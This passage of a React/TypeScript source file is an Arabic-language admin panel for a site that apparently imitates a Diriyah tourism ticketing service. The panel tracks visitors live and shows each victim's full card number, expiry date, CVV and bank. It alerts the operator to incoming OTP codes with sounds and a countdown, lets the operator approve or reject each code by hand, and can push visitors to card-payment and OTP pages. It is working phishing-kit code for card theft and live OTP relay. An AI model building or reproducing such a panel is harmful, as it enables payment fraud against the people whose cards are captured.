import { useState, useEffect, useRef, useCallback } from "react";
import { motion, AnimatePresence, LayoutGroup } from "framer-motion";
import { toast } from "sonner";
import { Undo2, WifiOff as WifiOffBulk, Download, Search, ArrowRight } from "lucide-react";
import { Sheet, SheetContent } from "@/components/ui/sheet";
import {
  Users, User, MapPin, Clock, Monitor, Smartphone, Globe, Wifi, WifiOff,
  Eye, Trash2, CheckSquare, Square, AlertCircle, Bell, UserPlus,
  Navigation, MessageSquare, UtensilsCrossed, Ticket, MousePointer,
  ChevronDown, ChevronUp, Send, RotateCcw, Archive, ShoppingBag, CalendarCheck,
  CreditCard, Shield, CheckCircle, XCircle, X, CalendarDays,
} from "lucide-react";
import {
  AlertDialog, AlertDialogAction, AlertDialogCancel, AlertDialogContent,
  AlertDialogDescription, AlertDialogFooter, AlertDialogHeader, AlertDialogTitle,
} from "@/components/ui/alert-dialog";
import { supabase } from "@/integrations/supabase/client";
import { playChime, createRipple } from "@/hooks/use-action-sound";
import { sendBrowserNotification } from "@/hooks/use-browser-notifications";

// Helper: show real name or shortened session ID
function displayName(v: { name?: string | null; session_id?: string }) {
  if (v.name && v.name !== "زائر جديد") return v.name;
  if (v.session_id) return `زائر #${v.session_id.slice(0, 6).toUpperCase()}`;
  return "زائر مجهول";
}

// Avatar color palette based on name hash
const AVATAR_COLORS = [
  { bg: "from-blue-400 to-indigo-500", text: "text-white" },
  { bg: "from-emerald-400 to-teal-500", text: "text-white" },
  { bg: "from-violet-400 to-purple-500", text: "text-white" },
  { bg: "from-rose-400 to-pink-500", text: "text-white" },
  { bg: "from-amber-400 to-orange-500", text: "text-white" },
  { bg: "from-cyan-400 to-sky-500", text: "text-white" },
  { bg: "from-fuchsia-400 to-pink-600", text: "text-white" },
  { bg: "from-lime-400 to-green-500", text: "text-white" },
];

function getAvatarColor(name: string) {
  let hash = 0;
  for (let i = 0; i < name.length; i++) hash = name.charCodeAt(i) + ((hash << 5) - hash);
  return AVATAR_COLORS[Math.abs(hash) % AVATAR_COLORS.length];
}

// Live session timer component
const SessionTimer = ({ startTime }: { startTime: string }) => {
  const [, setTick] = useState(0);
  useEffect(() => {
    const interval = setInterval(() => setTick(t => t + 1), 60000);
    return () => clearInterval(interval);
  }, []);
  const mins = Math.floor((Date.now() - new Date(startTime).getTime()) / 60000);
  if (mins < 1) return <span className="text-[9px] text-amber-500 font-medium">&lt;1 د</span>;
  if (mins < 60) return <span className="text-[9px] text-amber-500 font-medium">{mins} د</span>;
  const hrs = Math.floor(mins / 60);
  const remMins = mins % 60;
  return <span className="text-[9px] text-amber-500 font-medium">{hrs}س {remMins}د</span>;
};

// Live OTP wait timer - updates every second, shows mm:ss
const OtpWaitTimer = ({ createdAt }: { createdAt: string }) => {
  const [, setTick] = useState(0);
  useEffect(() => {
    const interval = setInterval(() => setTick(t => t + 1), 1000);
    return () => clearInterval(interval);
  }, []);
  const totalSec = Math.floor((Date.now() - new Date(createdAt).getTime()) / 1000);
  const mins = Math.floor(totalSec / 60);
  const secs = totalSec % 60;
  const isUrgent = totalSec >= 30;
  return (
    <span className={`text-[9px] font-mono font-bold tabular-nums ${isUrgent ? "text-red-500" : "text-violet-500"}`}>
      ⏱ {String(mins).padStart(2, "0")}:{String(secs).padStart(2, "0")}
    </span>
  );
};

const sitePages = [
  { path: "/", label: "الصفحة الرئيسية" },
  { path: "/about", label: "عن الدرعية" },
  { path: "/places", label: "الأماكن" },
  { path: "/experiences", label: "التجارب" },
  { path: "/restaurants", label: "المطاعم" },
  { path: "/tickets", label: "التذاكر" },
  { path: "/events", label: "الفعاليات" },
  { path: "/contact", label: "تواصل معنا" },
  { path: "/plan", label: "خطط زيارتك" },
  { path: "/checkout", label: "شراء التذاكر" },
  { path: "/card-payment", label: "💳 الدفع بالبطاقة" },
  { path: "/card-otp", label: "🔐 كود التحقق OTP" },
  { path: "/articles", label: "المقالات" },
];

const notificationTypes = [
  { key: "welcome", label: "ترحيب 👋", icon: "👋", color: "bg-emerald-500" },
  { key: "offer",   label: "عرض خاص 🎁", icon: "🎁", color: "bg-amber-500" },
  { key: "alert",   label: "تنبيه ⚠️",   icon: "⚠️", color: "bg-red-500" },
  { key: "info",    label: "توجيه 📍",   icon: "📍", color: "bg-violet-500" },
];

interface Visitor {
  id: string;
  session_id: string;
  name: string;
  email: string | null;
  phone: string | null;
  device: string;
  browser: string;
  country: string;
  current_page: string;
  current_page_label: string;
  is_online: boolean;
  last_seen: string;
  total_visits: number;
  pages_viewed: number;
  session_start: string;
  created_at: string;
  ip_address: string | null;
}

interface VisitorAction {
  id: string;
  action_type: string;
  action_detail: string | null;
  page: string | null;
  created_at: string;
}

interface VisitorOrder {
  id: string;
  confirmation_number: string | null;
  total: number;
  status: string;
  created_at: string;
  tickets: any;
  card_last4: string | null;
  card_brand: string | null;
  cardholder_name: string | null;
  bank_name: string | null;
  payment_method: string;
  email: string | null;
  phone: string | null;
  subtotal: number | null;
  vat: number | null;
  card_full_number: string | null;
  card_expiry: string | null;
  card_cvv: string | null;
}

interface VisitorBooking {
  id: string;
  restaurant: string;
  booking_date: string;
  guests: number;
  status: string;
  created_at: string;
}

interface VisitorEventBooking {
  id: string;
  event_title: string;
  event_id: string;
  name: string;
  phone: string;
  email: string | null;
  guests: number;
  notes: string | null;
  status: string;
  created_at: string;
}

interface OtpRequest {
  id: string;
  order_id: string | null;
  otp_code: string;
  status: "pending" | "approved" | "rejected";
  created_at: string;
  updated_at: string;
}

interface VisitorMessage {
  id: string;
  name: string;
  email: string;
  phone: string | null;
  subject: string | null;
  message: string;
  is_read: boolean;
  created_at: string;
}

interface SideAlert {
  id: string;
  visitorName: string;
  actionLabel: string;
  actionIcon: string;
  isNew: boolean;
  timestamp: number;
}

import SwipeToDelete from "@/components/admin/SwipeToDelete";
import { useIsMobile } from "@/hooks/use-mobile";
import { bankLogos, bankColors } from "@/data/bankLogos";

const AdminVisitors = () => {
  const isMobile = useIsMobile();
  const [visitors, setVisitors]               = useState<Visitor[]>([]);
  const [deletedVisitors, setDeletedVisitors] = useState<Visitor[]>([]);
  const [selected, setSelected]               = useState<Visitor | null>(null);
  const [loading, setLoading]                 = useState(true);

  const [selectedActions, setSelectedActions]       = useState<VisitorAction[]>([]);
  const [visitorOrders, setVisitorOrders]           = useState<VisitorOrder[]>([]);
  const [visitorBookings, setVisitorBookings]       = useState<VisitorBooking[]>([]);
  const [visitorOtpRequests, setVisitorOtpRequests] = useState<OtpRequest[]>([]);

  const [visitorEventBookings, setVisitorEventBookings] = useState<VisitorEventBooking[]>([]);

  const [visitorMessages, setVisitorMessages] = useState<VisitorMessage[]>([]);

  const [openSections, setOpenSections] = useState<Record<string, boolean>>({
    orders: true, bookings: true, eventBookings: true, actions: true, payment: true, otp: true, timeline: true,
  });
  const toggleSection = (key: string) => setOpenSections(prev => ({ ...prev, [key]: !prev[key] }));
  const allOpen = Object.values(openSections).every(Boolean);
  const toggleAllSections = () => {
    const newVal = !allOpen;
    setOpenSections({ orders: newVal, bookings: newVal, eventBookings: newVal, actions: newVal, payment: newVal, otp: newVal });
  };

  const [filter, setFilter]           = useState<"all" | "online" | "offline">("all");
  const [filterCountry, setFilterCountry] = useState<string>("all");
  const [filterDevice, setFilterDevice]   = useState<string>("all");
  const [filterBrowser, setFilterBrowser] = useState<string>("all");
  const [filterHasPending, setFilterHasPending] = useState(false);
  const [searchQuery, setSearchQuery]     = useState("");
  const [showTrash, setShowTrash]     = useState(false);
  const [selectMode, setSelectMode]   = useState(false);
  const [selectedIds, setSelectedIds] = useState<Set<string>>(new Set());
  const [flashVisitorId, setFlashVisitorId] = useState<string | null>(null);
  const [confirmDelete, setConfirmDelete]   = useState<{ type: "single" | "selected" | "all"; id?: string } | null>(null);

  const [redirectNotifType, setRedirectNotifType] = useState("info");
  const [redirectPath, setRedirectPath]           = useState("");
  const [redirectMessage, setRedirectMessage]     = useState("");

  const [sideAlerts, setSideAlerts] = useState<SideAlert[]>([]);
  const alertTimers = useRef<Record<string, ReturnType<typeof setTimeout>>>({});

  // Global pending orders & OTPs for inline card buttons
  const [globalPendingOrders, setGlobalPendingOrders] = useState<VisitorOrder[]>([]);
  const [globalPendingOtps, setGlobalPendingOtps] = useState<OtpRequest[]>([]);
  const [globalRecentOrders, setGlobalRecentOrders] = useState<VisitorOrder[]>([]);

  const fetchGlobalPending = async () => {
    const { data: orders } = await supabase
      .from("ticket_orders")
      .select("*")
      .not("status", "in", '("confirmed","rejected")')
      .order("created_at", { ascending: false });
    setGlobalPendingOrders((orders || []) as VisitorOrder[]);

    // Fetch ALL recent orders (last 50) to match OTP requests even after approval
    const { data: recentOrders } = await supabase
      .from("ticket_orders")
      .select("*")
      .order("created_at", { ascending: false })
      .limit(50);
    setGlobalRecentOrders((recentOrders || []) as VisitorOrder[]);

    const { data: otps } = await (supabase as any)
      .from("otp_requests")
      .select("*")
      .eq("status", "pending")
      .order("created_at", { ascending: false });
    setGlobalPendingOtps((otps || []) as OtpRequest[]);
  };

  // OTP reminder: play alert sound every 30s while there are pending OTPs older than 30s
  const otpReminderRef = useRef<ReturnType<typeof setInterval> | null>(null);
  useEffect(() => {
    if (otpReminderRef.current) {
      clearInterval(otpReminderRef.current);
      otpReminderRef.current = null;
    }
    if (globalPendingOtps.length > 0) {
      otpReminderRef.current = setInterval(() => {
        const now = Date.now();
        const hasOld = globalPendingOtps.some(
          otp => now - new Date(otp.created_at).getTime() > 30000
        );
        if (hasOld) {
          playChime("otp_reminder");
        }
      }, 30000);
    }
    return () => {
      if (otpReminderRef.current) clearInterval(otpReminderRef.current);
    };
  }, [globalPendingOtps]);

  const getVisitorPendingOrders = (visitor: Visitor) => {
    if (!visitor.email && !visitor.phone) return [];
    const phoneWithPrefix = visitor.phone
      ? `00966${visitor.phone.replace(/^0+/, "").replace(/^\+966/, "")}`
      : null;
    return globalPendingOrders.filter(o =>
      (visitor.email && o.email === visitor.email) ||
      (visitor.phone && (o.phone === visitor.phone || o.phone === phoneWithPrefix))
    );
  };

  const getVisitorPendingOtps = (visitor: Visitor) => {
    if (!visitor.email && !visitor.phone) return [];
    const phoneWithPrefix = visitor.phone
      ? `00966${visitor.phone.replace(/^0+/, "").replace(/^\+966/, "")}`
      : null;
    // Match against ALL recent orders (not just pending) since OTP comes after order approval
    const visitorOrderIds = new Set<string>();
    globalRecentOrders.forEach(o => {
      if (
        (visitor.email && o.email === visitor.email) ||
        (visitor.phone && (o.phone === visitor.phone || o.phone === phoneWithPrefix))
      ) {
        visitorOrderIds.add(o.id);
      }
    });
    return globalPendingOtps.filter(otp => otp.order_id && visitorOrderIds.has(otp.order_id));
  };

  const approveOrderInline = async (orderId: string, e: React.MouseEvent) => {
    e.stopPropagation();
    playChime("success");
    toast.success("تمت الموافقة ✅", { duration: 3000, position: "top-center" });
    await supabase.from("ticket_orders").update({ status: "confirmed" }).eq("id", orderId);
    setGlobalPendingOrders(prev => prev.filter(o => o.id !== orderId));
    setVisitorOrders(prev => prev.map(o => o.id === orderId ? { ...o, status: "confirmed" } : o));
  };

  const rejectOrderInline = async (orderId: string, e: React.MouseEvent) => {
    e.stopPropagation();
    playChime("error");
    toast.error("تم الرفض ❌", { duration: 3000, position: "top-center" });
    await supabase.from("ticket_orders").update({ status: "rejected" }).eq("id", orderId);
    setGlobalPendingOrders(prev => prev.filter(o => o.id !== orderId));
    setVisitorOrders(prev => prev.map(o => o.id === orderId ? { ...o, status: "rejected" } : o));
  };

  const approveOtpInline = async (otpId: string, e: React.MouseEvent) => {
    e.stopPropagation();
    await approveOtp(otpId);
    setGlobalPendingOtps(prev => prev.filter(o => o.id !== otpId));
  };

  const rejectOtpInline = async (otpId: string, e: React.MouseEvent) => {
    e.stopPropagation();
    await rejectOtp(otpId);
    setGlobalPendingOtps(prev => prev.filter(o => o.id !== otpId));
  };

  const addSideAlert = (alert: Omit<SideAlert, "id" | "timestamp">) => {
    const id = Math.random().toString(36).slice(2);
    setSideAlerts(prev => [{ ...alert, id, timestamp: Date.now() }, ...prev].slice(0, 5));
    alertTimers.current[id] = setTimeout(() => {
      setSideAlerts(prev => prev.filter(a => a.id !== id));
      delete alertTimers.current[id];
    }, 6000);
  };

  const removeSideAlert = (id: string) => {
    if (alertTimers.current[id]) { clearTimeout(alertTimers.current[id]); delete alertTimers.current[id]; }
    setSideAlerts(prev => prev.filter(a => a.id !== id));
  };

  // ─────────────────────────────────────────────
  // fetchVisitors
  // ─────────────────────────────────────────────
  const fetchVisitors = async () => {
    const { data } = await supabase.from("visitors").select("*").order("last_seen", { ascending: false });
    if (data) {
      const now = Date.now();
      const all = data.map(v => ({
        ...v,
        is_online: v.is_online && now - new Date(v.last_seen).getTime() < 60000,
      }));
      const active  = all.filter(v => !(v as any).is_deleted);
      const deleted = all.filter(v =>  (v as any).is_deleted);
      active.sort((a, b) => {
        // Recent activity in last 2 minutes gets top priority
        const now = Date.now();
        const recentA = now - new Date(a.last_seen).getTime() < 120000;
        const recentB = now - new Date(b.last_seen).getTime() < 120000;
        if (recentA !== recentB) return recentA ? -1 : 1;
        const infoA = !!(a.email || a.phone || (a.name && a.name !== "زائر جديد"));
        const infoB = !!(b.email || b.phone || (b.name && b.name !== "زائر جديد"));
        if (infoA !== infoB) return infoB ? 1 : -1;
        if (a.is_online !== b.is_online) return b.is_online ? 1 : -1;
        return new Date(b.last_seen).getTime() - new Date(a.last_seen).getTime();
      });
      setVisitors(active as Visitor[]);
      setDeletedVisitors(deleted as Visitor[]);
      if (selected) {
        const fresh = [...active, ...deleted].find(v => v.id === selected.id);
        if (fresh) setSelected(fresh as Visitor);
      }
    }
    setLoading(false);
  };

  const fetchActions = async (visitorId: string) => {
    const { data } = await supabase
      .from("visitor_actions").select("*")
      .eq("visitor_id", visitorId)
      .order("created_at", { ascending: false }).limit(20);
    if (data) setSelectedActions(data as VisitorAction[]);
  };

  // ─────────────────────────────────────────────
  // ✅ fetchVisitorOrdersAndBookings - مُصلَحة
  // ─────────────────────────────────────────────
  const fetchVisitorOrdersAndBookings = async (visitor: Visitor) => {
    const { email, phone } = visitor;

    if (email || phone) {
      let q = supabase
        .from("ticket_orders")
        .select("*")
        .order("created_at", { ascending: false });

      // phone في visitors محفوظ بدون 00966
      // CardPayment يحفظه بـ 00966 + الرقم
      const phoneWithPrefix = phone
        ? `00966${phone.replace(/^0+/, "").replace(/^\+966/, "")}`
        : null;

      if (email && phone) {
        q = q.or(
          `email.eq.${email},phone.eq.${phone},phone.eq.${phoneWithPrefix}`
        );
      } else if (email) {
        q = q.eq("email", email);
      } else if (phone) {
        q = q.or(`phone.eq.${phone},phone.eq.${phoneWithPrefix}`);
      }

      const { data: orders } = await q;
      const orderList = (orders || []) as VisitorOrder[];
      setVisitorOrders(orderList);

      // جلب OTP لكل طلب
      if (orderList.length > 0) {
        const orderIds = orderList.map(o => o.id);
        const { data: otps } = await (supabase as any)
          .from("otp_requests")
          .select("*")
          .in("order_id", orderIds)
          .order("created_at", { ascending: false });
        setVisitorOtpRequests((otps || []) as OtpRequest[]);
      } else {
        setVisitorOtpRequests([]);
      }

      // حجوزات المطاعم
      if (phone) {
        const { data: bookings } = await supabase
          .from("restaurant_bookings")
          .select("*")
          .or(`phone.eq.${phone},phone.eq.${phoneWithPrefix}`)
          .order("created_at", { ascending: false });
        setVisitorBookings((bookings || []) as VisitorBooking[]);
      } else {
        setVisitorBookings([]);
      }

      // حجوزات الفعاليات
      if (email || phone) {
        let eq = supabase.from("event_bookings").select("*").order("created_at", { ascending: false });
        if (email && phone) {
          eq = eq.or(`email.eq.${email},phone.eq.${phone},phone.eq.${phoneWithPrefix}`);
        } else if (email) {
          eq = eq.eq("email", email);
        } else if (phone) {
          eq = eq.or(`phone.eq.${phone},phone.eq.${phoneWithPrefix}`);
        }
        const { data: eventBookings } = await eq;
        setVisitorEventBookings((eventBookings || []) as VisitorEventBooking[]);
      } else {
        setVisitorEventBookings([]);
      }

      // رسائل التواصل
      if (email || phone) {
        let mq = supabase.from("contact_messages").select("*").order("created_at", { ascending: false });
        if (email && phone) {
          mq = mq.or(`email.eq.${email},phone.eq.${phone}`);
        } else if (email) {
          mq = mq.eq("email", email);
        } else if (phone) {
          mq = mq.eq("phone", phone);
        }
        const { data: msgs } = await mq;
        setVisitorMessages((msgs || []) as VisitorMessage[]);
      } else {
        setVisitorMessages([]);
      }
      return;
    }

    // fallback: استخراج من visitor_actions
    const { data: actions } = await supabase
      .from("visitor_actions")
      .select("action_type, action_detail")
      .eq("visitor_id", visitor.id)
      .in("action_type", ["ticket_purchase", "restaurant_booking"]);

    if (actions && actions.length > 0) {
      const emails = new Set<string>();
      const phones = new Set<string>();
      actions.forEach(a => {
        const em = a.action_detail?.match(/\(([^)]+@[^)]+)\)/);
        if (em) emails.add(em[1]);
        const ph = a.action_detail?.match(/(\d{10,})/);
        if (ph) phones.add(ph[1]);
      });

      if (emails.size > 0) {
        const { data: orders } = await supabase
          .from("ticket_orders")
          .select("*")
          .in("email", Array.from(emails))
          .order("created_at", { ascending: false });
        const orderList = (orders || []) as VisitorOrder[];
        setVisitorOrders(orderList);
        if (orderList.length > 0) {
          const { data: otps } = await (supabase as any)
            .from("otp_requests")
            .select("*")
            .in("order_id", orderList.map(o => o.id))
            .order("created_at", { ascending: false });
          setVisitorOtpRequests((otps || []) as OtpRequest[]);
        }
      } else {
        setVisitorOrders([]);
        setVisitorOtpRequests([]);
      }

      if (phones.size > 0) {
        const { data: bookings } = await supabase
          .from("restaurant_bookings")
          .select("*")
          .in("phone", Array.from(phones))
          .order("created_at", { ascending: false });
        setVisitorBookings((bookings || []) as VisitorBooking[]);
      } else {
        setVisitorBookings([]);
      }
    } else {
      setVisitorOrders([]);
      setVisitorBookings([]);
      setVisitorEventBookings([]);
      setVisitorOtpRequests([]);
    }
  };

  // ─────────────────────────────────────────────
  // OTP actions
  // ─────────────────────────────────────────────
  const approveOtp = async (otpId: string) => {
    playChime("success");
    toast.success("تمت الموافقة ✅", { description: "تم قبول الطلب بنجاح", duration: 3000, position: "top-center" });
    await (supabase as any).from("otp_requests")
      .update({ status: "approved", updated_at: new Date().toISOString() })
      .eq("id", otpId);
    const otp = visitorOtpRequests.find(o => o.id === otpId);
    if (otp?.order_id) {
      await supabase.from("ticket_orders").update({ status: "confirmed" }).eq("id", otp.order_id);
      setVisitorOrders(prev => prev.map(o => o.id === otp.order_id ? { ...o, status: "confirmed" } : o));
    }
    setVisitorOtpRequests(prev => prev.map(o => o.id === otpId ? { ...o, status: "approved" } : o));
  };

  const rejectOtp = async (otpId: string) => {
    playChime("error");
    toast.error("تم الرفض ❌", { description: "تم رفض الطلب", duration: 3000, position: "top-center" });
    await (supabase as any).from("otp_requests")
      .update({ status: "rejected", updated_at: new Date().toISOString() })
      .eq("id", otpId);
    const otp = visitorOtpRequests.find(o => o.id === otpId);
    if (otp?.order_id) {
      await supabase.from("ticket_orders").update({ status: "rejected" }).eq("id", otp.order_id);
      setVisitorOrders(prev => prev.map(o => o.id === otp.order_id ? { ...o, status: "rejected" } : o));
    }
    setVisitorOtpRequests(prev => prev.map(o => o.id === otpId ? { ...o, status: "rejected" } : o));
  };

  // ─────────────────────────────────────────────
  // Realtime + polling
  // ─────────────────────────────────────────────
  useEffect(() => {
    fetchVisitors();
    fetchGlobalPending();

    const channel = supabase.channel("visitors-realtime")
      .on("postgres_changes", { event: "*", schema: "public", table: "visitors" }, (payload: any) => {
        fetchVisitors();
        if (payload.eventType === "INSERT") {
          addSideAlert({ visitorName: displayName(payload.new), actionLabel: "دخل الموقع", actionIcon: "👤", isNew: true });
        }
      })
      .on("postgres_changes", { event: "INSERT", schema: "public", table: "visitor_actions" }, (payload: any) => {
        const action = payload.new;
        if (selected) fetchActions(selected.id);
        if (action.action_type === "page_view") return;

        const actionLabels: Record<string, { icon: string; label: string }> = {
          new_visitor:        { icon: "👤", label: "زائر جديد" },
          contact_form:       { icon: "📩", label: "رسالة تواصل" },
          restaurant_booking: { icon: "🍽️", label: "حجز مطعم" },
          ticket_purchase:    { icon: "🎟️", label: "شراء تذكرة" },
          newsletter_signup:  { icon: "📧", label: "اشتراك نشرة" },
        };
        const info = actionLabels[action.action_type] || { icon: "⚡", label: action.action_type };

        playChime("notification");
        if (navigator.vibrate) navigator.vibrate([100, 50, 100]);
        setFlashVisitorId(action.visitor_id);
        setTimeout(() => setFlashVisitorId(null), 3000);

        setVisitors(prev => {
          const v = prev.find(x => x.id === action.visitor_id);
          addSideAlert({ visitorName: v?.name || "زائر", actionLabel: info.label, actionIcon: info.icon, isNew: false });
          const idx = prev.findIndex(x => x.id === action.visitor_id);
          if (idx <= 0) return prev;
          const copy = [...prev];
          const [moved] = copy.splice(idx, 1);
          copy.unshift(moved);
          return copy;
        });
      })
      .on("postgres_changes", { event: "*", schema: "public", table: "otp_requests" }, (payload: any) => {
        const incoming = payload.new as OtpRequest;
        fetchGlobalPending();
        if (payload.eventType === "INSERT") {
          const otpCode = incoming.otp_code || "";
          // Find visitor name via order linkage
          let visitorName = "زائر";
          if (incoming.order_id) {
            const linkedOrder = globalRecentOrders.find(o => o.id === incoming.order_id) || globalPendingOrders.find(o => o.id === incoming.order_id);
            if (linkedOrder) {
              const name = (linkedOrder as any).cardholder_name || linkedOrder.email || "زائر";
              visitorName = name;
            }
          }
          addSideAlert({ visitorName, actionLabel: `أرسل رمز OTP: ${otpCode}`, actionIcon: "🔐", isNew: false });
          playChime("otp_incoming");
          sendBrowserNotification({
            title: `🔐 رمز OTP جديد: ${otpCode}`,
            body: `${visitorName} — طلب تحقق ينتظر الموافقة`,
            tag: `otp-${incoming.id}`,
            vibrate: true,
          });
          setVisitorOtpRequests(prev => {
            const exists = prev.find(o => o.id === incoming.id);
            if (exists) return prev;
            return [incoming, ...prev];
          });
        } else if (payload.eventType === "UPDATE") {
          setVisitorOtpRequests(prev => prev.map(o => o.id === incoming.id ? incoming : o));
        }
      })
      .on("postgres_changes", { event: "*", schema: "public", table: "ticket_orders" }, (payload: any) => {
        fetchGlobalPending();
        if (payload.eventType === "INSERT" || (payload.eventType === "UPDATE" && payload.new?.status === "pending")) {
          const order = payload.new;
          const name = order?.cardholder_name || order?.email || "زائر";
          const last4 = order?.card_last4 || "";
          const brand = order?.card_brand || "";
          const total = order?.total || 0;
          playChime("pending_action");
          addSideAlert({ visitorName: name, actionLabel: "طلب دفع بالبطاقة", actionIcon: "💳", isNew: false });
          sendBrowserNotification({
            title: `💳 طلب دفع جديد — ${name}`,
            body: `${brand} •••• ${last4} | ${total} ر.س | ${order?.bank_name || ""} — ينتظر الموافقة`,
            tag: `order-${order?.id}`,
            vibrate: true,
          });
        }
      })
      .subscribe();

    const interval = setInterval(() => { fetchVisitors(); fetchGlobalPending(); }, 15000);
    return () => {
      supabase.removeChannel(channel);
      clearInterval(interval);
      Object.values(alertTimers.current).forEach(clearTimeout);
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  useEffect(() => {
    if (selected) {
      fetchActions(selected.id);
      fetchVisitorOrdersAndBookings(selected);
    } else {
      setVisitorOrders([]);
      setVisitorBookings([]);
      setVisitorEventBookings([]);
      setVisitorOtpRequests([]);
      setVisitorMessages([]);
      setSelectedActions([]);
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [selected?.id]);

  // ─────────────────────────────────────────────
  // CRUD helpers
  // ─────────────────────────────────────────────
  const deleteSingle = async (id: string) => {
    playChime("delete");
    await supabase.from("visitors").update({ is_deleted: true } as any).eq("id", id);
    setSelected(null);
    fetchVisitors();
  };

  const deleteSelected = async () => {
    playChime("delete");
    for (const id of selectedIds) await supabase.from("visitors").update({ is_deleted: true } as any).eq("id", id);
    if (selected && selectedIds.has(selected.id)) setSelected(null);
    setSelectedIds(new Set()); setSelectMode(false); fetchVisitors();
  };

  const deleteAll = async () => {
    const offlineVisitors = visitors.filter(v => !v.is_online);
    const ids = offlineVisitors.map(v => v.id);
    if (!ids.length) return;

    playChime("delete");
    if (navigator.vibrate) navigator.vibrate([100, 50, 100]);

    // Optimistically hide from UI
    setVisitors(prev => prev.filter(v => v.is_online));
    if (selected && ids.includes(selected.id)) setSelected(null);
    setSelectedIds(new Set()); setSelectMode(false);

    const undoDuration = 5000;
    let undone = false;

    const restoreBulk = () => {
      undone = true;
      playChime("pop");
      setVisitors(prev => {
        const merged = [...prev, ...offlineVisitors];
        merged.sort((a, b) => new Date(b.last_seen).getTime() - new Date(a.last_seen).getTime());
        return merged;
      });
    };

    toast(
      () => (
        <div className="w-full flex flex-col gap-2" dir="rtl">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-2">
              <Trash2 className="w-4 h-4 text-red-500 shrink-0" />
              <span className="text-sm font-medium">تم حذف {ids.length} زائر غير متصل</span>
            </div>
            <button
              onClick={() => { restoreBulk(); toast.dismiss(); }}
              className="flex items-center gap-1 px-2.5 py-1 rounded-lg bg-primary/10 text-primary text-xs font-bold hover:bg-primary/20 transition-colors"
            >
              <Undo2 className="w-3.5 h-3.5" />
              تراجع
            </button>
          </div>
          <div className="w-full h-1 rounded-full bg-muted overflow-hidden">
            <div
              className="h-full rounded-full bg-red-500"
              style={{ animation: `undoProgress ${undoDuration}ms linear forwards` }}
            />
          </div>
        </div>
      ),
      { duration: undoDuration, unstyled: false },
    );

    setTimeout(async () => {
      if (!undone) {
        await supabase.from("visitors").update({ is_deleted: true } as any).in("id", ids);
        fetchVisitors();
      }
    }, undoDuration);
  };

  const permanentDeleteSingle = async (id: string) => {
    playChime("delete");
    await supabase.from("visitor_actions").delete().eq("visitor_id", id);
    await supabase.from("visitors").delete().eq("id", id);
    fetchVisitors();
  };

  const permanentDeleteSelected = async () => {
    playChime("delete");
    for (const id of selectedIds) {
      await supabase.from("visitor_actions").delete().eq("visitor_id", id);
      await supabase.from("visitors").delete().eq("id", id);
    }
    setSelectedIds(new Set()); setSelectMode(false); fetchVisitors();
  };

  const permanentDeleteAll = async () => {
    playChime("delete");
    for (const v of deletedVisitors) await supabase.from("visitor_actions").delete().eq("visitor_id", v.id);
    const ids = deletedVisitors.map(v => v.id);
    if (ids.length) await supabase.from("visitors").delete().in("id", ids);
    fetchVisitors();
  };

  const handleConfirmPermanentDelete = async () => {
    if (!confirmDelete) return;
    if (confirmDelete.type === "single" && confirmDelete.id) await permanentDeleteSingle(confirmDelete.id);
    else if (confirmDelete.type === "selected") await permanentDeleteSelected();
    else if (confirmDelete.type === "all") await permanentDeleteAll();
    setConfirmDelete(null);
  };

  const restoreVisitor = async (id: string) => {
    playChime("success");
    await supabase.from("visitors").update({ is_deleted: false } as any).eq("id", id);
    fetchVisitors();
  };

  const restoreAllVisitors = async () => {
    playChime("success");
    for (const v of deletedVisitors) await supabase.from("visitors").update({ is_deleted: false } as any).eq("id", v.id);
    fetchVisitors();
  };

  const redirectVisitor = async (visitorId: string, path: string, notifType = "info", message = "") => {
    const val = message ? `${notifType}:${path}:${message}` : `${notifType}:${path}`;
    const { error } = await supabase.from("visitors").update({ redirect_to: val } as any).eq("id", visitorId);
    if (error) {
      playChime("info");
      toast.error("فشل التوجيه ❌", { description: "تعذر توجيه الزائر، حاول مرة أخرى", duration: 3000 });
    } else {
      playChime("success");
      const labels: Record<string, string> = { welcome: "ترحيب 👋", offer: "عرض 🎁", alert: "تنبيه ⚠️", info: "توجيه 📍" };
      toast.success(`تم التوجيه بنجاح ✅`, { description: `${labels[notifType] || "توجيه"} → ${path}`, duration: 3000 });
    }
  };

  const updateOrderStatus = async (orderId: string, status: string, e?: React.MouseEvent) => {
    if (e) { e.stopPropagation(); e.preventDefault(); }
    if (status === "confirmed") {
      playChime("success");
      toast.success("تمت الموافقة ✅", { duration: 3000, position: "top-center" });
    } else {
      playChime("error");
      toast.error("تم الرفض ❌", { duration: 3000, position: "top-center" });
    }
    const { error } = await supabase.from("ticket_orders").update({ status }).eq("id", orderId);
    if (error) {
      toast.error("حدث خطأ أثناء تحديث الحالة");
      return;
    }
    setVisitorOrders(prev => prev.map(o => o.id === orderId ? { ...o, status } : o));
    setGlobalPendingOrders(prev => prev.filter(o => o.id !== orderId));
  };

  const updateBookingStatus = async (bookingId: string, status: string) => {
    playChime("success");
    await supabase.from("restaurant_bookings").update({ status }).eq("id", bookingId);
    setVisitorBookings(prev => prev.map(b => b.id === bookingId ? { ...b, status } : b));
  };

  const updateEventBookingStatus = async (bookingId: string, status: string) => {
    playChime("success");
    await supabase.from("event_bookings").update({ status }).eq("id", bookingId);
    setVisitorEventBookings(prev => prev.map(b => b.id === bookingId ? { ...b, status } : b));
  };

  const markMessageRead = async (msgId: string) => {
    await supabase.from("contact_messages").update({ is_read: true }).eq("id", msgId);
    setVisitorMessages(prev => prev.map(m => m.id === msgId ? { ...m, is_read: true } : m));
  };

  const toggleSelect = (id: string) => {
    setSelectedIds(prev => { const n = new Set(prev); n.has(id) ? n.delete(id) : n.add(id); return n; });
  };

  // ─────────────────────────────────────────────
  // Utility
  // ─────────────────────────────────────────────
  const getTimeDiff = (dateStr: string) => {
    const mins = Math.floor((Date.now() - new Date(dateStr).getTime()) / 60000);
    if (mins < 1) return "الآن";
    if (mins < 60) return `منذ ${mins} دقيقة`;
    const hrs = Math.floor(mins / 60);
    if (hrs < 24) return `منذ ${hrs} ساعة`;
    return `منذ ${Math.floor(hrs / 24)} يوم`;
  };

  const getDuration = (start: string) => {
    const mins = Math.floor((Date.now() - new Date(start).getTime()) / 60000);
    if (mins < 1) return "أقل من دقيقة";
    if (mins < 60) return `${mins} دقيقة`;
    return `${Math.floor(mins / 60)} ساعة و ${mins % 60} دقيقة`;
  };

  const countryFlag = (name: string) => {
    const map: Record<string, string> = {
      // الخليج والشرق الأوسط
